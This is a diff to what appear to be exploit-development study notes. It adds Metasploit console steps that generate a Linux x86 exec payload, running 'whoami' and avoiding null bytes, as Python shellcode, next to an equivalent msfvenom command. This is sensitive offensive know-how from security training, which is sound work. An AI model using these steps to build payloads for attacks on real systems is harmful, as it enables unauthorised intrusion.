@@ -415,6 +415,16 @@ msfvenom -p /linux/x86/exec CMD=whoami -b '\x00' -f python    # Creates payload
 msfvenom --list payloads    # Lists all the payloads
 
 ```
+
+## msfcon for linus
+```
+msfdb init
+msfconsole
+use payload/linux/x86/exec   
+show options
+set CMD whoami # set the command for the payload saw in options
+generate -b '\x00' -f python #makes payload -b is tell it to not use the NULL Byte
+```
 # Demo Windows
 ### The Setup
 * Run strings.exe on the executable
